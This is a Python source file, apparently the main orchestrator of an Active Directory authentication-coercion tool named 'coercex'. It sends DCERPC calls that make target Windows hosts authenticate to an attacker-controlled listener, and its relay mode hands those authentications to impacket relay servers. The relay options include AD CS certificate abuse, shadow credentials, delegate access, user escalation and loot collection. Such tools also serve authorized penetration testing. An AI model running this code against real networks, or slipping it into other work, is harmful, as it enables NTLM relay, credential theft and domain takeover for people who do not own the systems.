"""Main scan/coerce/fuzz orchestrator.

Ties together the DCERPC connection pool, async listener, and method
registry into a high-performance concurrent pipeline.

Four modes:
  - scan:   No listener, classify RPC error codes to detect vulnerable methods.
  - coerce: Optionally starts listener, triggers with UNC paths, confirms callbacks.
  - fuzz:   Tries multiple path styles/transports per method (listener optional).
  - relay:  Starts impacket relay servers and triggers coercion.
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass
from enum import Enum, auto

from rich.console import Console

from coercex.connection import DCERPCPool, trigger_method
from coercex.listener import AsyncListener
from coercex.methods import get_all_methods
from coercex.methods.base import CoercionMethod, PipeBinding
from coercex.relay import RelayConfig, RelayManager
from coercex.utils import (
    Credentials,
    ScanResult,
    ScanStats,
    Transport,
    TriggerResult,
    build_unc_path,
)

log = logging.getLogger("coercex.scanner")

# ── Rich status styling ─────────────────────────────────────────────
_STATUS_STYLE = {
    TriggerResult.VULNERABLE: ("bold green", "[+]"),
    TriggerResult.ACCESSIBLE: ("yellow", "[~]"),
    TriggerResult.ACCESS_DENIED: ("red", "[-]"),
    TriggerResult.NOT_AVAILABLE: ("dim", "[ ]"),
    TriggerResult.CONNECT_ERROR: ("bold red", "[!]"),
    TriggerResult.TIMEOUT: ("magenta", "[T]"),
    TriggerResult.UNKNOWN_ERROR: ("dim red", "[?]"),
}


class Mode(Enum):
    SCAN = auto()
    COERCE = auto()
    FUZZ = auto()
    RELAY = auto()


@dataclass
class ScanConfig:
    """Configuration for a scan run."""

    targets: list[str]
    mode: Mode = Mode.SCAN
    protocols: list[str] | None = None
    creds: Credentials | None = None
    listener_host: str = ""  # Attacker IP for coerce/fuzz (empty = no listener)
    http_port: int = 80
    smb_port: int = 445
    transport: Transport = Transport.SMB
    concurrency: int = 50
    timeout: int = 5
    callback_timeout: float = 3.0  # Time to wait for listener callback
    verbose: bool = False

    # Relay mode settings (only used when mode=RELAY)
    relay_targets: list[str] | None = None
    relay_adcs: bool = False
    relay_adcs_template: str = ""
    relay_altname: str = ""
    relay_shadow_credentials: bool = False
    relay_shadow_target: str = ""
    relay_delegate_access: bool = False
    relay_escalate_user: str = ""
    relay_socks: bool = False
    relay_lootdir: str = ""

    @property
    def has_listener(self) -> bool:
        """Whether a listener IP was provided."""
        return bool(self.listener_host)


class Scanner:
    """Orchestrates the coercion scan pipeline.

    Usage:
        scanner = Scanner(config)
        stats = await scanner.run()
    """

    def __init__(self, config: ScanConfig, console: Console | None = None):
        self.config = config
        self.console = console or Console(stderr=True)
        self.stats = ScanStats()
        self._pool: DCERPCPool | None = None
        self._listener: AsyncListener | None = None
        self._relay: RelayManager | None = None
        self._semaphore = asyncio.Semaphore(config.concurrency)

    async def run(self) -> ScanStats:
        """Execute the scan and return aggregate stats."""
        creds = self.config.creds or Credentials()
        self._pool = DCERPCPool(creds, timeout=self.config.timeout)

        methods = get_all_methods(self.config.protocols)
        if not methods:
            log.error("No methods matched protocol filter")
            return self.stats

        self.stats.total_targets = len(self.config.targets)

        self.console.print(
            f"[bold cyan]coercex[/] | mode=[bold]{self.config.mode.name.lower()}[/] "
            f"targets=[bold]{len(self.config.targets)}[/] methods=[bold]{len(methods)}[/] "
            f"concurrency=[bold]{self.config.concurrency}[/]"
        )

        # Start listener for coerce/fuzz modes (only if listener_host is set)
        if self.config.mode in (Mode.COERCE, Mode.FUZZ) and self.config.has_listener:
            self._listener = AsyncListener(
                host="0.0.0.0",
                http_port=self.config.http_port,
                smb_port=self.config.smb_port,
                enable_http=self.config.transport == Transport.HTTP,
                enable_smb=self.config.transport == Transport.SMB,
            )
            await self._listener.start()
            self.console.print(
                f"[green]Listener started[/] "
                f"(http={self.config.http_port}, smb={self.config.smb_port})"
            )

        # Start relay servers for relay mode
        if self.config.mode == Mode.RELAY:
            if not self.config.listener_host:
                log.error("Listener/interface IP required for relay mode")
                return self.stats
            if not self.config.relay_targets:
                log.error("Relay target(s) required for relay mode (--relay-to)")
                return self.stats

            relay_cfg = RelayConfig(
                relay_targets=self.config.relay_targets,
                interface_ip=self.config.listener_host,
                http_port=self.config.http_port,
                smb_port=self.config.smb_port,
                adcs=self.config.relay_adcs,
                adcs_template=self.config.relay_adcs_template,
                altname=self.config.relay_altname,
                shadow_credentials=self.config.relay_shadow_credentials,
                shadow_target=self.config.relay_shadow_target,
                delegate_access=self.config.relay_delegate_access,
                escalate_user=self.config.relay_escalate_user,
                socks=self.config.relay_socks,
                lootdir=self.config.relay_lootdir,
            )
            self._relay = RelayManager(relay_cfg)
            self._relay.start()
            self.console.print(
                f"[green]Relay servers started[/] -> "
                f"{', '.join(self.config.relay_targets)}"
            )

        try:
            if self.config.mode == Mode.FUZZ:
                await self._run_fuzz(methods)
            elif self.config.mode == Mode.RELAY:
                await self._run_relay(methods)
            else:
                await self._run_scan_or_coerce(methods)
        finally:
            if self._pool:
                await self._pool.close_all()
            if self._listener:
                await self._listener.stop()
            if self._relay:
                self._relay.stop()

        return self.stats

    async def _run_scan_or_coerce(self, methods: list[CoercionMethod]) -> None:
        """Dispatch all target x method x pipe combinations."""
        tasks: list[asyncio.Task[None]] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    task = asyncio.create_task(self._attempt(target, method, binding))
                    tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _run_fuzz(self, methods: list[CoercionMethod]) -> None:
        """Fuzz mode: try all path styles per method."""
        tasks: list[asyncio.Task[None]] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport_name, path_style in method.path_styles:
                        transport = (
                            Transport.HTTP
                            if transport_name == "http"
                            else Transport.SMB
                        )
                        task = asyncio.create_task(
                            self._attempt(
                                target,
                                method,
                                binding,
                                transport_override=transport,
                                path_style_override=path_style,
                            )
                        )
                        tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _run_relay(self, methods: list[CoercionMethod]) -> None:
        """Relay mode: trigger coercion, relay servers handle NTLM auth."""
        tasks: list[asyncio.Task[None]] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    task = asyncio.create_task(
                        self._attempt_relay(target, method, binding)
                    )
                    tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _attempt_relay(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
    ) -> None:
        """Single relay trigger attempt."""
        async with self._semaphore:
            transport = self.config.transport
            path_style = "share_file"

            port = (
                self.config.http_port
                if transport == Transport.HTTP
                else self.config.smb_port
            )
            from coercex.utils import random_string

            token = random_string(12)
            path = build_unc_path(
                self.config.listener_host,
                token,
                transport,
                port=port,
                path_style=path_style,
            )

            assert self._pool is not None
            result = await trigger_method(self._pool, target, method, binding, path)
            self.stats.add(result)
            self._emit(result)

    async def _attempt(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport_override: Transport | None = None,
        path_style_override: str | None = None,
    ) -> None:
        """Single trigger attempt, bounded by semaphore."""
        pool = self._pool
        assert pool is not None
        async with self._semaphore:
            transport = transport_override or self.config.transport
            path_style = path_style_override or "share_file"

            # Determine if we're operating with a listener
            use_listener = (
                self.config.mode in (Mode.COERCE, Mode.FUZZ)
                and self.config.has_listener
                and self._listener is not None
            )

            if self.config.mode == Mode.SCAN or (
                self.config.mode in (Mode.COERCE, Mode.FUZZ) and not use_listener
            ):
                # No listener: use dummy path, classify errors only
                path = build_unc_path(
                    "127.0.0.1", "coercexscan", transport, path_style=path_style
                )
                result = await trigger_method(pool, target, method, binding, path)
            else:
                # Listener active: use real path with correlation token
                listener = self._listener
                assert listener is not None
                token, future = listener.create_token()

                port = (
                    self.config.http_port
                    if transport == Transport.HTTP
                    else self.config.smb_port
                )
                path = build_unc_path(
                    self.config.listener_host,
                    token,
                    transport,
                    port=port,
                    path_style=path_style,
                )

                result = await trigger_method(pool, target, method, binding, path)

                # Wait for callback if trigger indicated vulnerability
                if future and result.result in (
                    TriggerResult.VULNERABLE,
                    TriggerResult.ACCESSIBLE,
                ):
                    try:
                        callback = await asyncio.wait_for(
                            future, timeout=self.config.callback_timeout
                        )
                        result.callback_received = True
                        result.source_ip = callback.source_ip
                        result.result = TriggerResult.VULNERABLE
                    except asyncio.TimeoutError:
                        pass
                elif future and listener:
                    listener.cancel_token(token)

            self.stats.add(result)
            self._emit(result)

    def _emit(self, result: ScanResult) -> None:
        """Print a result line (only for interesting results unless verbose)."""
        if self.config.verbose or result.result in (
            TriggerResult.VULNERABLE,
            TriggerResult.ACCESSIBLE,
        ):
            style, sym = _STATUS_STYLE.get(result.result, ("dim red", "[?]"))
            cb = " [bold green](callback!)[/]" if result.callback_received else ""
            self.console.print(
                f"[{style}]{sym}[/] {result.target} | "
                f"[blue]{result.protocol}[/]::{result.method} "
                f"via [dim]{result.pipe}[/]{cb}"
            )
